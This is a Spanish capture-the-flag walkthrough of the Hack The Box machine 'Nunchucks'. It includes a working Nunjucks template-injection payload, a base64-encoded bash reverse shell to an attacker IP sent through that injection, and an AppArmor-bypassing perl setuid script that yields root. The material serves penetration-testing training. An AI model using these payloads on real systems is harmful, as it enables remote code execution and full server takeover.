10.10.11.122 - Nunchucks

![Nunchucks](https://user-images.githubusercontent.com/96772264/201742691-c8bcd404-0abd-409d-a2d9-964e9cb6b79d.png)

------------------------
# Part 1: Reconocimiento del sistema

Puertos abiertos: 22(ssh), 80(http), 443(https). Nmap nos dice que hay una web en el puerto 80, nos redirige a nunchucks.htb (nginx/1.18.0)
Metemos ese nombre del dominio en /etc/hosts.  
Analizando por openssl no damos con subdominios ```openssl s_client -connect nunchucks.htb:443;```  

La web parece una plataforma de ecommerce:
![nunchuks1](https://user-images.githubusercontent.com/96772264/201742804-b700e108-a55d-4612-ad10-8ee194f80a27.PNG)

La unica ruta que encontramos es /signup, pero no nos deja:  
![nunchuks2](https://user-images.githubusercontent.com/96772264/201742853-d2a26a2d-57ce-4811-ba87-ebbeb8386bc2.PNG)

Fuzzing de subdominios:
```console
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc=301 --hw=2271 \
-H "Host: FUZZ.nunchucks.htb" -u https://nunchucks.htb -t 100
000000081:   200        101 L    259 W      4028 Ch     "store"
└─$ whatweb https://store.nunchucks.htb
Bootstrap, Cookies[_csrf], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], JQuery[1.10.2], X-Powered-By[Express]
```

------------------------
# Part 2: Web vulnerable a STTI (nunjucks)

Si ponemos este nuevo dominio en el /etc/hosts, podremos acceder a la web de la tienda, que también está en pañales.
![nunchuks3](https://user-images.githubusercontent.com/96772264/201742958-098c7d88-523d-4b31-858d-ab8371284de3.PNG)

Solo hay un campo para hacer un /POST a store.nunchucks.htb/api/submit con una dirección de correo.  Pese a que no tenemos nada de python, al reflejarse nuestro 
input podemos probar un STTI que resuelve.  

![nunchuks4](https://user-images.githubusercontent.com/96772264/201742973-9ed98043-3233-41fc-874e-fe90187cf88d.PNG)

```console
└─$ curl https://store.nunchucks.htb/api/submit -k -d 'email={{7*7}}'
{"response":"You will receive updates on the following email address: 49."}
```
En efecto, un STTI. Probando otro payload ```{{cycler.__init__.__globals__.os.popen('whoami').read()}}``` nos da error. Estamos ante express en vez de python
así que habria que buscar payloads de express.  

En [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) hay una seccion de SSTI, donde si bajamos podemos encontrar 
payloads para node.js (express), para distintas librerias, entre ellas destaca nunjucks.  

```console
└─$ curl https://store.nunchucks.htb/api/submit -k \
-d "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('whoami')\")()}}"
{"response":"You will receive updates on the following email address: undefined."}

└─$ echo bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1' | base64 -w0
YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyLzQ0MyAwPiYxCg== 

└─$ curl https://store.nunchucks.htb/api/submit -k \
-d "email={{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyLzQ0MyAwPiYxCg== | base64 -d | bash')\")()}}"
```

------------------------
# Part 3: Apparmor y perl

Y tenemos consola. Si corremos nuestro script de enumeración:  
- Usuarios: root, david (nosotros)  
- Hay varios logs en /var/log  
- En /opt hay dos archivos interesantes -> /opt/backup.pl, /opt/web_backups  
- Capabilities -> /usr/bin/perl = cap_setuid+ep  
 
Hay una capability de perl, en gtfobins nos enseñan a usarla:  
```console
david@nunchucks:/opt$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root
david@nunchucks:/opt$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
nada
```
¿Porqué no nos deja? En linux hay programas de seguridad como Selinux o apparmor. En este caso está el segundo ya que existe la ruta /etc/apparmor.d  

```console
david@nunchucks:~$ ls /etc/apparmor.d
abstractions  force-complain  lsb_release      sbin.dhclient  usr.bin.man   usr.sbin.ippusbxd  usr.sbin.rsyslogd
disable       local           nvidia_modprobe  tunables       usr.bin.perl  usr.sbin.mysqld    usr.sbin.tcpdump
```
El script /backup.pl utiliza lineas como use POSIX qw(setuid); y POSIX::setuid(0); para hacer ciertas tareas en contexto privilegiado (hacer una copia de 
todo /var/www). Si miramos el archivo **usr.bin.perl**

- Se activa para la capability en uso: ```capability setuid,```    
- Impedir permiso a ciertos archivos: ```deny /root/* rwx,```      
- Solo permitir ciertos comandos: ```/usr/bin/whoami mrix,```  

Buscando en google ```apparmor perl script``` di con [esto](https://bugs.launchpad.net/apparmor/+bug/1911431) 
Hay que crear un script en perl con el codigo de gtfobins que usarmos antes pero que nos daba permiso denegado:  
```perl
#!/usr/bin/perl

use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh
```
```console
david@nunchucks:~$ chmod +x ./exploit.pl
david@nunchucks:~$ ./exploit.pl
# whoami
root
```
¿Y por que ahora si? La respuesta está en el sehabang (#!/usr/bin/perl). Al cambiar los permisos con **chmod+x**  (hacerlo un ejecutable) se puede correr 
sin especificar el interprete (perl) porque eso ya lo hace el sheabang. El script del backup que encontramos se ejecuta privilegiadamente justo por esto.

Según el articulo hay una función del kernel de linux (bprm_creds_for_exec) que es la que ejecuta el script, está antes que la que cambia el sheabang por
```perl ./exploit.pl``` (search_binary_handler). 



